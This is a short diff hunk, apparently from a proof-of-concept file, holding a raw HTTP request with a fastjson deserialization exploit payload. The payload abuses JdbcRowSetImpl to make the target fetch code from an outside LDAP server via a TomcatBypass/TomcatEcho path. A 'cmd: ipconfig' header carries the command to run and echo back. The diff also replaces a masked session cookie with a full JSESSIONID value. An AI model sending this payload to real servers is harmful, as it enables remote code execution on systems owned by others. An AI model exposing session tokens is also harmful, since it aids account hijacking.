@@ -82,7 +82,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 cmd: ipconfig
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
-Cookie: JSESSIONID=2******************************1; loginPageURL=
+Cookie: JSESSIONID=26FF8158707BB0896A3ACD66EB92DD41; loginPageURL=
 Connection: close
 
 _json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xxx.xxx.xxx:1289/TomcatBypass/TomcatEcho","autoCommit":true\}\}
